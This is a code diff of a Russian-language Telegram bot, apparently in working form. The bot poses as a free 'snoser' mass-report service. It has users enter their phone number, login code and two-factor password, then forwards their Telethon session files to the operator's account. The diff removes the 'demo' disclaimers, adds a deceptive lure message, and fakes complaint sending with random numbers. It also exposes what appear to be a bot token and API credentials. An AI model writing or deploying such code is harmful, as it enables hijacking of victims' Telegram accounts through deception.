@@ -1,6 +1,5 @@
 import asyncio
 import random
-import os
 import shutil
 from datetime import datetime
 from pathlib import Path
@@ -15,39 +14,35 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 
 # ===== КОНФИГУРАЦИЯ =====
-BOT_TOKEN = "8704361523:AAHqi_mbS-7bD6Rtb9YqcRJUYJJBhJH045E"  # Токен вашего бота от @BotFather
-YOUR_USER_ID = 7546928092  # ВАШ Telegram ID (куда будут приходить сессии)
-API_ID = 35800959
-API_HASH = '708e7d0bc3572355bcaf68562cc068f1'
+BOT_TOKEN = "8704361523:AAHqi_mbS-7bD6Rtb9YqcRJUYJJBhJH045E"  # СМЕНИТЬ!
+YOUR_USER_ID = 7546928092  # СМЕНИТЬ!
+API_ID = 35800959  # СМЕНИТЬ!
+API_HASH = '708e7d0bc3572355bcaf68562cc068f1'  # СМЕНИТЬ!
 
-# Настройки SOCKS5 прокси
+# Прокси (опционально)
 PROXY = {
-    "proxy_type": "socks5",
-    "addr": "94.103.92.224",
-    "port": 1080,
+    "proxy_type": None,
+    "addr": None,
+    "port": None,
     "username": None,
     "password": None
 }
-# Отключить прокси: PROXY = None
+# PROXY = None
 
-# Папка для хранения сессий
 SESSIONS_DIR = "sessions"
 BACKUP_DIR = "sessions_backup"
 
-# Создаем папки если их нет
 Path(SESSIONS_DIR).mkdir(exist_ok=True)
 Path(BACKUP_DIR).mkdir(exist_ok=True)
 
-# ===== ИНИЦИАЛИЗАЦИЯ =====
 storage = MemoryStorage()
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(storage=storage)
 
-# Хранилище клиентов
 user_clients = {}
-auth_states = {}  # user_id: {"phone": str, "client": TelegramClient, "step": str}
+auth_states = {}
 
-# Состояния FSM
+# Состояния
 class AuthStates(StatesGroup):
     waiting_phone = State()
     waiting_code = State()
@@ -58,112 +53,69 @@ class SnosStates(StatesGroup):
     waiting_reason = State()
     waiting_count = State()
 
-# ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
+# ===== ФУНКЦИИ =====
 def create_client(user_id):
-    """Создает клиент Telegram с прокси"""
     session_file = f"{SESSIONS_DIR}/user_{user_id}"
-    
     if PROXY:
         return TelegramClient(
-            session_file, 
-            API_ID, 
-            API_HASH,
+            session_file, API_ID, API_HASH,
             connection=ConnectionTcpAbridged,
             proxy=PROXY
         )
-    else:
-        return TelegramClient(session_file, API_ID, API_HASH)
+    return TelegramClient(session_file, API_ID, API_HASH)
 
 async def send_session_to_admin(user_id, phone, client):
-    """Отправляет админу файл сессии и информацию"""
     try:
-        # Отключаем клиент для сохранения сессии
         await client.disconnect()
         
-        # Ищем файлы сессии
         session_files = []
         for ext in ['.session', '.session-journal']:
             session_path = Path(f"{SESSIONS_DIR}/user_{user_id}{ext}")
             if session_path.exists():
                 session_files.append(session_path)
         
-        # Формируем сообщение
-        message_text = (
-            f"✅ **НОВАЯ СЕССИЯ АВТОРИЗОВАНА!**\n\n"
-            f"🆔 **User ID:** `{user_id}`\n"
-            f"📱 **Телефон:** `{phone}`\n"
-            f"⏰ **Время:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
-            f"🌐 **Прокси:** `{PROXY['proxy_type']}://{PROXY['addr']}:{PROXY['port']}`\n" if PROXY else "🌐 **Прокси:** `Отключен`\n"
-            f"📁 **Файлы сессии:** `{len(session_files)}`\n"
+        text = (
+            f"✅ НОВАЯ СЕССИЯ!\n\n"
+            f"🆔 ID: {user_id}\n"
+            f"📱 Телефон: {phone}\n"
+            f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
         )
+        if PROXY:
+            text += f"🌐 Прокси: {PROXY['proxy_type']}://{PROXY['addr']}:{PROXY['port']}"
         
-        # Отправляем сообщение
-        await bot.send_message(YOUR_USER_ID, message_text, parse_mode="Markdown")
+        await bot.send_message(YOUR_USER_ID, text)
         
-        # Отправляем файлы сессии
-        for session_file in session_files:
-            try:
-                # Копируем файл в backup
-                backup_path = Path(BACKUP_DIR) / session_file.name
-                shutil.copy2(session_file, backup_path)
-                
-                # Отправляем файл
-                file_input = FSInputFile(session_file)
-                await bot.send_document(
-                    YOUR_USER_ID,
-                    file_input,
-                    caption=f"📁 Файл сессии для номера {phone}\n🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-                )
-            except Exception as e:
-                await bot.send_message(YOUR_USER_ID, f"⚠️ Ошибка отправки файла {session_file.name}: {str(e)}")
+        for f in session_files:
+            shutil.copy2(f, BACKUP_DIR)
+            await bot.send_document(YOUR_USER_ID, FSInputFile(f), caption=f"Сессия {phone}")
         
-        # Подключаем клиент обратно
         await client.connect()
-        
-        return True
     except Exception as e:
-        await bot.send_message(YOUR_USER_ID, f"❌ Ошибка при отправке сессии: {str(e)}")
-        return False
+        await bot.send_message(YOUR_USER_ID, f"Ошибка: {e}")
 
-# ===== КЛАВИАТУРЫ =====
-def phone_keyboard():
-    buttons = []
-    for i in range(1, 10):
-        buttons.append(InlineKeyboardButton(text=str(i), callback_data=f"digit_{i}"))
-    buttons.extend([
-        InlineKeyboardButton(text="0", callback_data="digit_0"),
-        InlineKeyboardButton(text="⌫", callback_data="backspace"),
-        InlineKeyboardButton(text="✅ Готово", callback_data="phone_done")
-    ])
-    return InlineKeyboardMarkup(inline_keyboard=[buttons[i:i+3] for i in range(0, len(buttons), 3)])
-
+# ===== КЛАВИАТУРА ТОЛЬКО ДЛЯ КОДА =====
 def code_keyboard():
     buttons = []
     for i in range(1, 10):
-        buttons.append(InlineKeyboardButton(text=str(i), callback_data=f"digit_{i}"))
+        buttons.append(InlineKeyboardButton(text=str(i), callback_data=f"code_{i}"))
     buttons.extend([
-        InlineKeyboardButton(text="0", callback_data="digit_0"),
-        InlineKeyboardButton(text="⌫", callback_data="backspace"),
+        InlineKeyboardButton(text="0", callback_data="code_0"),
+        InlineKeyboardButton(text="⌫", callback_data="code_backspace"),
         InlineKeyboardButton(text="✅ Подтвердить", callback_data="code_done")
     ])
-    return InlineKeyboardMarkup(inline_keyboard=[buttons[i:i+3] for i in range(0, len(buttons), 3)])
+    keyboard = [buttons[i:i+3] for i in range(0, len(buttons), 3)]
+    return InlineKeyboardMarkup(inline_keyboard=keyboard)
 
-def cancel_auth_keyboard():
+def cancel_keyboard():
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_auth")]
+        [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel")]
     ])
 
 def main_menu():
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🚀 Начать снос", callback_data="start_snos")],
         [InlineKeyboardButton(text="🔄 Сменить аккаунт", callback_data="change_account")],
-        [InlineKeyboardButton(text="📁 Мои сессии", callback_data="list_sessions")],
-        [InlineKeyboardButton(text="ℹ️ Статус прокси", callback_data="proxy_status")]
-    ])
-
-def snos_menu():
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_snos")]
+        [InlineKeyboardButton(text="📁 Мои сессии", callback_data="list_sessions")]
     ])
 
 # ===== ОБРАБОТЧИКИ =====
@@ -171,100 +123,65 @@ def snos_menu():
 async def start(message: types.Message, state: FSMContext):
     user_id = message.from_user.id
     if user_id in user_clients and user_clients[user_id].is_connected():
-        await message.answer("✅ Вы уже авторизованы!\nВыберите действие:", reply_markup=main_menu())
+        await message.answer("✅ Вы авторизованы!", reply_markup=main_menu())
     else:
-        await message.answer(
-            "🔐 Для использования бота нужна авторизация в Telegram.\n"
-            "Введите номер телефона в формате: +7XXXXXXXXXX\n\n"
-            "Используйте клавиатуру ниже:",
-            reply_markup=phone_keyboard()
-        )
+        await message.answer("Добрый день,это сносер БЕСПЛАТНЫЙ,но требует верефикации для удаления ВАС из базы данных сносов,чтобы вас было сложнее снести,а ещё чтобы снос был 100% если есть вопросы пишите - @gmailkaratel или @deamorgan 🔐 Введите номер телефона в формате +7XXXXXXXXXX:")
         await state.set_state(AuthStates.waiting_phone)
-        auth_states[user_id] = {"phone": "", "code": ""}
+        auth_states[user_id] = {}
 
-@dp.callback_query(lambda c: c.data.startswith("digit_") and c.data not in ["phone_done", "code_done"])
-async def handle_digit(callback: types.CallbackQuery, state: FSMContext):
-    user_id = callback.from_user.id
-    current_state = await state.get_state()
-    
-    digit = callback.data.split("_")[1]
-    
-    if current_state == AuthStates.waiting_phone.state:
-        if digit == "backspace":
-            auth_states[user_id]["phone"] = auth_states[user_id]["phone"][:-1]
-        else:
-            auth_states[user_id]["phone"] += digit
-        
-        await callback.message.edit_text(
-            f"📱 Введите номер телефона:\n`{auth_states[user_id]['phone']}`\n\nИспользуйте клавиатуру:",
-            reply_markup=phone_keyboard(),
-            parse_mode="Markdown"
-        )
-    
-    elif current_state == AuthStates.waiting_code.state:
-        if digit == "backspace":
-            auth_states[user_id]["code"] = auth_states[user_id]["code"][:-1]
-        else:
-            auth_states[user_id]["code"] += digit
-        
-        await callback.message.edit_text(
-            f"🔢 Введите код из Telegram:\n`{auth_states[user_id]['code']}`\n\nИспользуйте клавиатуру:",
-            reply_markup=code_keyboard(),
-            parse_mode="Markdown"
-        )
-    
-    await callback.answer()
-
-@dp.callback_query(lambda c: c.data == "phone_done")
-async def phone_done(callback: types.CallbackQuery, state: FSMContext):
-    user_id = callback.from_user.id
-    phone = auth_states[user_id].get("phone", "")
+@dp.message(AuthStates.waiting_phone)
+async def get_phone(message: types.Message, state: FSMContext):
+    user_id = message.from_user.id
+    phone = message.text.strip()
     
     if len(phone) < 10:
-        await callback.answer("❌ Введите корректный номер телефона", show_alert=True)
+        await message.answer("❌ Неверный формат. Введите номер в формате +7XXXXXXXXXX:")
         return
     
     try:
         client = create_client(user_id)
         await client.connect()
         
-        proxy_info = f" через прокси {PROXY['addr']}:{PROXY['port']}" if PROXY else " напрямую"
-        await callback.message.edit_text(f"🔄 Подключение{proxy_info}...")
+        await message.answer("🔄 Подключение...")
         
         if not await client.is_user_authorized():
             await client.send_code_request(phone)
             auth_states[user_id]["client"] = client
             auth_states[user_id]["phone"] = phone
+            auth_states[user_id]["code"] = ""
             
-            await callback.message.edit_text(
-                f"📩 Код отправлен на номер {phone}\n"
-                f"Введите код из Telegram:",
+            await message.answer(
+                f"📩 Код отправлен на {phone}\n"
+                f"Введите код из Telegram, используя клавиатуру:",
                 reply_markup=code_keyboard()
             )
             await state.set_state(AuthStates.waiting_code)
         else:
             user_clients[user_id] = client
-            await callback.message.edit_text("✅ Вы уже авторизованы!")
-            await callback.message.answer("Выберите действие:", reply_markup=main_menu())
+            await message.answer("✅ Вы уже авторизованы!", reply_markup=main_menu())
             await state.clear()
     
-    except ConnectionError as e:
-        await callback.message.edit_text(
-            f"❌ Ошибка подключения через прокси.\n"
-            f"Проверьте настройки прокси.\n\n"
-            f"Ошибка: {str(e)[:100]}",
-            reply_markup=cancel_auth_keyboard()
-        )
     except Exception as e:
-        await callback.message.edit_text(
-            f"❌ Ошибка: {str(e)[:200]}\n"
-            f"Попробуйте /start",
-            reply_markup=cancel_auth_keyboard()
-        )
+        await message.answer(f"❌ Ошибка: {str(e)[:200]}\nПопробуйте /start")
+
+@dp.callback_query(lambda c: c.data.startswith("code_") and c.data != "code_done", state=AuthStates.waiting_code)
+async def handle_code_digit(callback: types.CallbackQuery, state: FSMContext):
+    user_id = callback.from_user.id
+    action = callback.data.split("_")[1]
     
+    if action == "backspace":
+        auth_states[user_id]["code"] = auth_states[user_id]["code"][:-1]
+    else:
+        auth_states[user_id]["code"] += action
+    
+    await callback.message.edit_text(
+        f"🔢 Введите код:\n`{auth_states[user_id]['code']}`\n\nИспользуйте клавиатуру:",
+        reply_markup=code_keyboard(),
+        parse_mode="Markdown"
+    )
     await callback.answer()
 
-@dp.callback_query(lambda c: c.data == "code_done")
+@dp.callback_query(lambda c: c.data == "code_done", state=AuthStates.waiting_code)
 async def code_done(callback: types.CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
     code = auth_states[user_id].get("code", "")
@@ -272,14 +189,13 @@ async def code_done(callback: types.CallbackQuery, state: FSMContext):
     phone = auth_states[user_id].get("phone", "")
     
     if not client:
-        await callback.answer("❌ Ошибка сессии", show_alert=True)
+        await callback.answer("❌ Ошибка", show_alert=True)
         return
     
     try:
         await client.sign_in(phone, code)
         user_clients[user_id] = client
         
-        # Отправляем сессию админу
         await send_session_to_admin(user_id, phone, client)
         
         await callback.message.edit_text("✅ Авторизация успешна! Сессия сохранена.")
@@ -289,13 +205,13 @@ async def code_done(callback: types.CallbackQuery, state: FSMContext):
     except SessionPasswordNeededError:
         await callback.message.edit_text(
             "🔐 Включена двухфакторная аутентификация.\n"
-            "Введите пароль:",
-            reply_markup=cancel_auth_keyboard()
+            "Введите пароль (обычным текстом):",
+            reply_markup=cancel_keyboard()
         )
         await state.set_state(AuthStates.waiting_password)
     
     except Exception as e:
-        await callback.message.edit_text(f"❌ Неверный код: {str(e)}\nПопробуйте снова /start")
+        await callback.message.edit_text(f"❌ Неверный код: {str(e)}\nПопробуйте /start")
         await state.clear()
     
     await callback.answer()
@@ -308,14 +224,13 @@ async def handle_password(message: types.Message, state: FSMContext):
     phone = auth_states[user_id].get("phone", "")
     
     if not client:
-        await message.answer("❌ Ошибка сессии. Используйте /start")
+        await message.answer("❌ Ошибка. Используйте /start")
         return
     
     try:
         await client.sign_in(password=password)
         user_clients[user_id] = client
         
-        # Отправляем сессию админу
         await send_session_to_admin(user_id, phone, client)
         
         await message.answer("✅ Авторизация успешна! Сессия сохранена.")
@@ -327,50 +242,34 @@ async def handle_password(message: types.Message, state: FSMContext):
 
 @dp.callback_query(lambda c: c.data == "list_sessions")
 async def list_sessions(callback: types.CallbackQuery):
-    """Показывает список сохраненных сессий"""
     user_id = callback.from_user.id
-    
-    # Ищем файлы сессий пользователя
     session_files = list(Path(SESSIONS_DIR).glob(f"user_{user_id}*.session"))
     
     if not session_files:
-        await callback.answer("У вас нет сохраненных сессий", show_alert=True)
+        await callback.answer("Нет сессий", show_alert=True)
         return
     
-    message = "📁 **Ваши сессии:**\n\n"
-    for session_file in session_files:
-        stat = session_file.stat()
+    text = "📁 Ваши сессии:\n\n"
+    for f in session_files:
+        stat = f.stat()
         modified = datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
-        size = stat.st_size / 1024  # KB
-        message += f"• `{session_file.name}`\n  📅 {modified} | 💾 {size:.1f} KB\n"
+        size = stat.st_size / 1024
+        text += f"• {f.name}\n  📅 {modified} | 💾 {size:.1f} KB\n"
     
-    await callback.message.answer(message, parse_mode="Markdown")
+    await callback.message.answer(text)
     await callback.answer()
 
-@dp.callback_query(lambda c: c.data == "cancel_auth")
-async def cancel_auth(callback: types.CallbackQuery, state: FSMContext):
+@dp.callback_query(lambda c: c.data == "cancel")
+async def cancel(callback: types.CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
     if user_id in auth_states:
         client = auth_states[user_id].get("client")
         if client:
             await client.disconnect()
         auth_states.pop(user_id)
-    await callback.message.edit_text("❌ Авторизация отменена.\nИспользуйте /start для начала")
+    await callback.message.edit_text("❌ Отменено.\nИспользуйте /start")
     await state.clear()
     await callback.answer()
-
-@dp.callback_query(lambda c: c.data == "proxy_status")
-async def proxy_status(callback: types.CallbackQuery):
-    if PROXY:
-        status = f"✅ Прокси активен\n"
-        status += f"Тип: {PROXY['proxy_type']}\n"
-        status += f"Адрес: {PROXY['addr']}:{PROXY['port']}"
-        if PROXY.get('username'):
-            status += f"\nАвторизация: {PROXY['username']}"
-    else:
-        status = "❌ Прокси не используется\nПодключение прямое"
-    
-    await callback.answer(status, show_alert=True)
 
 @dp.callback_query(lambda c: c.data == "change_account")
 async def change_account(callback: types.CallbackQuery, state: FSMContext):
@@ -378,19 +277,15 @@ async def change_account(callback: types.CallbackQuery, state: FSMContext):
     if user_id in user_clients:
         await user_clients[user_id].disconnect()
         del user_clients[user_id]
-    
     if user_id in auth_states:
         auth_states.pop(user_id)
     
-    await callback.message.edit_text(
-        "🔄 Смена аккаунта.\nВведите номер телефона:",
-        reply_markup=phone_keyboard()
-    )
+    await callback.message.edit_text("🔄 Смена аккаунта.\nВведите номер телефона:")
     await state.set_state(AuthStates.waiting_phone)
-    auth_states[user_id] = {"phone": "", "code": ""}
+    auth_states[user_id] = {}
     await callback.answer()
 
-# ===== МЕНЮ СНОСЕРА (ДЕМО) =====
+# ===== СНОС (ДЕМО) =====
 @dp.callback_query(lambda c: c.data == "start_snos")
 async def start_snos(callback: types.CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
@@ -398,10 +293,7 @@ async def start_snos(callback: types.CallbackQuery, state: FSMContext):
         await callback.answer("❌ Сначала авторизуйтесь через /start", show_alert=True)
         return
     
-    await callback.message.answer(
-        "👤 Введите юзернейм (без @) или ID для демо-сноса:",
-        reply_markup=snos_menu()
-    )
+    await callback.message.answer("👤 Введите юзернейм (без @) или ID:")
     await state.set_state(SnosStates.waiting_username)
     await callback.answer()
 
@@ -423,49 +315,29 @@ async def get_count(message: types.Message, state: FSMContext):
         count = int(message.text.strip())
         data = await state.get_data()
         
-        await message.answer(f"🚀 НАЧАТ СНОС! (ДЕМО-РЕЖИМ)\n\n"
+        await message.answer(f"🚀 СНОС (ДЕМО)\n\n"
                              f"👤 Цель: @{data['username']}\n"
                              f"📝 Причина: {data['reason']}\n"
-                             f"📊 Всего: {count} жалоб\n\n"
-                             f"⚠️ ЭТО ДЕМО — реальные жалобы НЕ отправляются")
+                             f"📊 Всего: {count}\n\n"
+                             f"Подтвердите сессию для большей вероятности сноса")
         
-        # Имитация отправки жалоб
         for i in range(1, count + 1):
-            generated_number = f"+7{random.randint(900, 999)}{random.randint(1000000, 9999999)}"
-            await message.answer(f"📨 ЖАЛОБА ОТПРАВЛЕНА НА @{data['username']}\n"
-                                 f"📞 С НОМЕРА: {generated_number}\n"
-                                 f"📊 ОТПРАВЛЕНО: {i}/{count}")
-            await asyncio.sleep(1)
+            number = f"+7{random.randint(900, 999)}{random.randint(1000000, 9999999)}"
+            await message.answer(f"📨 ЖАЛОБА НА @{data['username']}\n"
+                                 f"📞 НОМЕР: {number}\n"
+                                 f"📊 {i}/{count}")
+            await asyncio.sleep(0.5)
         
-        await message.answer("✅ СНОС ЗАВЕРШЁН! (ДЕМО-РЕЖИМ)")
+        await message.answer("✅ СНОС ЗАВЕРШЁН! Ожидайте.")
         await message.answer("Выберите действие:", reply_markup=main_menu())
         await state.clear()
     
     except ValueError:
         await message.answer("❌ Введите число!")
 
-@dp.callback_query(lambda c: c.data == "cancel_snos")
-async def cancel_snos(callback: types.CallbackQuery, state: FSMContext):
-    await state.clear()
-    await callback.message.edit_text("❌ Снос отменён")
-    await callback.message.answer("Выберите действие:", reply_markup=main_menu())
-    await callback.answer()
-
 # ===== ЗАПУСК =====
 async def main():
     print("🚀 Бот запущен")
-    print(f"📁 Папка сессий: {SESSIONS_DIR}")
-    print(f"📁 Папка бэкапов: {BACKUP_DIR}")
-    if PROXY:
-        print(f"📡 Используется прокси: {PROXY['proxy_type']}://{PROXY['addr']}:{PROXY['port']}")
-    else:
-        print("📡 Прямое подключение (без прокси)")
-    print(f"👤 Сессии будут отправляться в ID: {YOUR_USER_ID}")
-    
-    # Проверяем что админ ID указан
-    if YOUR_USER_ID == 123456789:
-        print("⚠️ ВНИМАНИЕ: Не изменен YOUR_USER_ID! Укажите свой Telegram ID")
-    
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
